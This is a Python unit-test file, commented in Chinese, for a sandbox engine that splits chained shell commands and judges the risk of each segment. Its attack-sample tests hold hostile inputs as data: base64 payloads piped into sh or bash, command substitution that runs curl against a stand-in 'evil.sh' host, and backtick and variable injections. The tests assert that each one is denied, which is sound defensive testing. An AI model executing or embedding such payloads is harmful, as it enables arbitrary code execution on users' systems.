"""T11 沙箱命令拆分判定自动化验证。

覆盖（工单验收面）：
  1. 安全组合命令按段判定：bash -c / cmd /c / powershell -Command 包装与裸链
     （&& || ; |）两条路径，放行（全段白名单）/ 审批（任一段写入或未知）；
  2. 攻击样例集全部拦截：编码变体（解释器段 DENY）、$ 变量/$() 注入、反引号、
     嵌套引号、\\ 续行符、重定向、单 &、悬挂操作符、%VAR% 变量、引号未闭合；
  3. plan 只读模式逐段收紧：任一段非只读 → 整条 DENY；
  4. 回滚开关 settings.command_split_enabled：默认开；置 false 恢复 T11 前整体拒绝旧行为；
  5. run_command 执行门（command_tools 判定入口）与判定引擎共用同一 fail-closed 解析器，
     且 execute_command / run_command_outside 判定入口维持元字符拒绝不变。

运行：python backend/tests/test_t11_command_split.py
"""
import json
import sys
import unittest
from pathlib import Path
from unittest import mock

BACKEND_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BACKEND_DIR))

import app.core.command_tools as CT
from app.core.config import settings
from app.core.tool_runtime.risk_engine import (
    CommandRiskEngine,
    RiskLevel,
    Verdict,
    chain_gate_allows,
)


def _set_split_flag(value):
    """通过 Settings extra="allow" 挂载回滚开关（与 backend/.env 落地路径同语义）。"""
    setattr(settings, "command_split_enabled", value)


def _clear_split_flag():
    if hasattr(settings, "command_split_enabled"):
        delattr(settings, "command_split_enabled")


class SafeChainSplitTestCase(unittest.TestCase):
    """安全组合命令按段判定：全部段通过才放行，任一段写入/未知 → 审批。"""

    def setUp(self):
        self.engine = CommandRiskEngine()
        _clear_split_flag()

    def tearDown(self):
        _clear_split_flag()

    # ── wrapper 路径：bash -c / cmd /c / powershell -Command ──

    def test_bash_wrapper_mkdir_cd_is_approval_not_deny(self):
        # 工单驱动样例：mkdir && cd 安全组合不再被元字符一刀切 DENY（cd 段未知 → 强制人工审批）
        d = self.engine.evaluate('bash -c "mkdir x && cd x"')
        self.assertEqual(d.verdict, Verdict.HIGH_RISK)
        self.assertNotIn("不允许的字符", d.reason)

    def test_bash_wrapper_pip_pytest_require_approval(self):
        d = self.engine.evaluate('bash -c "pip install requests && pytest"')
        self.assertEqual(d.verdict, Verdict.REQUIRE_APPROVAL)
        self.assertEqual(d.risk_level, RiskLevel.WRITE)

    def test_cmd_wrapper_readonly_chain_allow(self):
        d = self.engine.evaluate('cmd /c "dir && ver"')
        self.assertEqual(d.verdict, Verdict.ALLOW)

    def test_cmd_wrapper_write_chain_require_approval(self):
        d = self.engine.evaluate('cmd /c "mkdir x && cd x"')
        self.assertEqual(d.verdict, Verdict.HIGH_RISK)

    def test_powershell_wrapper_readonly_cmdlets_allow(self):
        d = self.engine.evaluate('powershell -Command "Get-Process; Get-Content a.txt"')
        self.assertEqual(d.verdict, Verdict.ALLOW)

    def test_powershell_wrapper_write_cmdlet_require_approval(self):
        d = self.engine.evaluate('powershell -Command "Get-Item x; echo hi"')
        self.assertEqual(d.verdict, Verdict.REQUIRE_APPROVAL)

    # ── 裸链路径：&& || ; | 顶层拆分 ──

    def test_bare_readonly_chain_allow(self):
        for cmd in ("pytest && git status", "git status && git diff && git log"):
            d = self.engine.evaluate(cmd)
            self.assertEqual(d.verdict, Verdict.ALLOW, msg=cmd)

    def test_pipe_to_non_whitelisted_is_approval(self):
        # head 不在白名单 → 该段未知 → HIGH_RISK 强制人工审批（不再被元字符门一刀切 DENY）
        d = self.engine.evaluate("git log | head")
        self.assertEqual(d.verdict, Verdict.HIGH_RISK)

    def test_bare_write_chain_require_approval(self):
        d = self.engine.evaluate("pip install x && pytest")
        self.assertEqual(d.verdict, Verdict.REQUIRE_APPROVAL)
        d = self.engine.evaluate("git add . && git status")
        self.assertEqual(d.verdict, Verdict.REQUIRE_APPROVAL)

    def test_bare_unknown_segment_high_risk(self):
        # 未知段保守默认 HIGH_RISK（强制人工审批，不可被 auto_approve 放行）
        d = self.engine.evaluate("git status && ls -la")
        self.assertEqual(d.verdict, Verdict.HIGH_RISK)

    def test_or_and_semicolon_pipe_all_split(self):
        # || 与 ; 同样拆段：mkdir（写入）+ ver（白名单）→ 审批；不受操作符种类影响
        d = self.engine.evaluate("mkdir x || ver")
        self.assertEqual(d.verdict, Verdict.REQUIRE_APPROVAL)
        d = self.engine.evaluate("ver; git status")
        self.assertEqual(d.verdict, Verdict.ALLOW)

    def test_non_chain_command_unchanged(self):
        # 非链式命令不走拆分路径，行为与 T11 前一致
        d = self.engine.evaluate("git status")
        self.assertEqual(d.verdict, Verdict.ALLOW)
        d = self.engine.evaluate("pip install requests")
        self.assertEqual(d.verdict, Verdict.REQUIRE_APPROVAL)

    # ── plan 只读模式：任一段非只读 → 整条 DENY ──

    def test_plan_readonly_chain_allow(self):
        d = self.engine.evaluate("pytest && git status", mode="plan")
        self.assertEqual(d.verdict, Verdict.ALLOW)

    def test_plan_write_chain_deny(self):
        d = self.engine.evaluate("pip install x && pytest", mode="plan")
        self.assertEqual(d.verdict, Verdict.DENY)

    def test_plan_unknown_segment_deny(self):
        d = self.engine.evaluate('bash -c "mkdir x && cd x"', mode="plan")
        self.assertEqual(d.verdict, Verdict.DENY)


class AttackSampleTestCase(unittest.TestCase):
    """攻击样例集：无法安全解析/解释器段 → 整条维持 DENY（fail-closed 不放松）。"""

    def setUp(self):
        self.engine = CommandRiskEngine()

    def _assert_deny(self, cmd):
        d = self.engine.evaluate(cmd)
        self.assertEqual(d.verdict, Verdict.DENY, msg=cmd)

    # ── 编码变体：管道进解释器 = 不透明代码执行，段级拒绝 ──

    def test_encoded_payload_to_sh_denied(self):
        self._assert_deny("echo YmFzZTY0IGlk | base64 -d | sh")

    def test_encoded_payload_to_bash_in_wrapper_denied(self):
        self._assert_deny('bash -c "echo aGk= | base64 -d | bash"')

    def test_interpreter_segment_denied(self):
        for seg in ("sh payload.sh", "bash -x p.sh", "eval", "source .env"):
            self._assert_deny(f"git status && {seg}")

    def test_python_pipe_target_never_auto_allows(self):
        # python 不在解释器拒绝清单（保住 python -m pytest 白名单段），
        # 但作为管道目标走标准梯子 → 未知 → HIGH_RISK 强制人工审批，绝不自动放行
        d = self.engine.evaluate("echo aGk= | base64 -d | python")
        self.assertIn(d.verdict, (Verdict.DENY, Verdict.HIGH_RISK))

    # ── $ 变量展开 / $() 注入 ──

    def test_dollar_expansion_denied(self):
        for cmd in ("echo $HOME && ls", "bash -c 'echo $USER'", "git status && $TOOL"):
            self._assert_deny(cmd)

    def test_command_substitution_denied(self):
        for cmd in ("pytest && $(curl http://evil.sh)", 'bash -c "echo $(whoami)"', "mkdir `whoami` && ls"):
            self._assert_deny(cmd)

    def test_backtick_denied(self):
        for cmd in ("bash -c \"echo `id` && ls\"", "echo `whoami` && git status"):
            self._assert_deny(cmd)

    # ── 嵌套引号 / 引号未闭合 ──

    def test_nested_quotes_denied(self):
        for cmd in (
            'bash -c "echo \'a\' && id"',          # 外双内单
            "bash -c 'echo \"x\" && ls'",           # 外单内双
            'bash -c "echo \\"a b\\" && pwd"',      # 内层转义引号
        ):
            self._assert_deny(cmd)

    def test_unbalanced_quote_denied(self):
        self._assert_deny('echo "abc && ls')
        self._assert_deny("git status && echo 'abc")

    # ── \ 续行符 / 重定向 / 单 & / 悬挂操作符 ──

    def test_line_continuation_denied(self):
        for cmd in (r"mkdir x &&\ ls", r"pytest &&\ git status", "pytest &&\\"):
            self._assert_deny(cmd)

    def test_redirect_denied(self):
        for cmd in ("echo x > f && ls", "cat < f && ls", "bash -c 'ls > out.txt'"):
            self._assert_deny(cmd)

    def test_single_ampersand_denied(self):
        # cmd 单 & 是合法串接符（bash 语义是后台），无法静态判定 → fail-closed
        for cmd in ('cmd /c "dir & echo x"', "git status &&& git diff", "ver & dir"):
            self._assert_deny(cmd)

    def test_hanging_operator_denied(self):
        for cmd in ("git status &&", "&& git status", "git status ;", "git log |", "| head"):
            self._assert_deny(cmd)

    def test_cmd_percent_variable_denied(self):
        self._assert_deny('cmd /c "echo %PATH% && dir"')

    def test_quoted_metachar_segment_denied(self):
        # 段内引号包裹的元字符（如 findstr "a|b"）不做拆分放松，维持整体拒绝
        self._assert_deny('findstr "a|b" file.txt && git status')


class RollbackSwitchTestCase(unittest.TestCase):
    """回滚开关 settings.command_split_enabled：默认开；关闭后恢复 T11 前整体拒绝旧行为。"""

    def setUp(self):
        self.engine = CommandRiskEngine()
        _clear_split_flag()

    def tearDown(self):
        _clear_split_flag()

    def test_default_enabled(self):
        self.assertTrue(chain_gate_allows('bash -c "mkdir x && cd x"'))
        d = self.engine.evaluate('bash -c "mkdir x && cd x"')
        self.assertNotEqual(d.verdict, Verdict.DENY)

    def test_disabled_restores_legacy_deny(self):
        for value in ("false", "0", "no", "off", "False"):
            _set_split_flag(value)
            try:
                self.assertFalse(chain_gate_allows('bash -c "mkdir x && cd x"'), msg=value)
                d = self.engine.evaluate('bash -c "mkdir x && cd x"')
                self.assertEqual(d.verdict, Verdict.DENY, msg=value)
                d = self.engine.evaluate("pytest && git status")
                self.assertEqual(d.verdict, Verdict.DENY, msg=value)
            finally:
                _clear_split_flag()

    def test_truthy_value_keeps_enabled(self):
        _set_split_flag("true")
        try:
            self.assertTrue(chain_gate_allows("pytest && git status"))
        finally:
            _clear_split_flag()


class CommandToolsGateTestCase(unittest.TestCase):
    """command_tools 判定入口与判定引擎一致性：run_command 门放行可解析链，其余门维持拒绝。"""

    def setUp(self):
        _clear_split_flag()

    def tearDown(self):
        _clear_split_flag()

    def test_run_command_gate_relaxes_parseable_chain(self):
        # 门放行（可安全拆分）→ 走到执行层：命令不存在时得到"找不到命令"而非元字符拒绝
        out = CT.run_command(".", "t11_nonexist_a && t11_nonexist_b")
        self.assertNotIn("不允许的字符", out)
        self.assertIn("找不到命令", out)

    def test_run_command_gate_keeps_unparseable_deny(self):
        out = CT.run_command(".", "echo x > f && t11_nonexist_a")
        self.assertIn("不允许的字符", out)

    def test_run_command_gate_rollback(self):
        _set_split_flag("false")
        try:
            out = CT.run_command(".", "t11_nonexist_a && t11_nonexist_b")
            self.assertIn("不允许的字符", out)
        finally:
            _clear_split_flag()

    def test_execute_command_gate_unchanged(self):
        # execute_command 风险引擎（evaluate_execute）未放开链式判定 → 执行门同步维持拒绝
        out = json.loads(CT.execute_command(".", "cd a && npm i"))
        self.assertEqual(out["exit_code"], -1)
        self.assertIn("不允许的字符", out["stderr"])

    def test_outside_engine_chain_deny_unchanged(self):
        d = CommandRiskEngine().evaluate_outside("cmd && echo hi")
        self.assertEqual(d.verdict, Verdict.DENY)


if __name__ == "__main__":
    unittest.main()
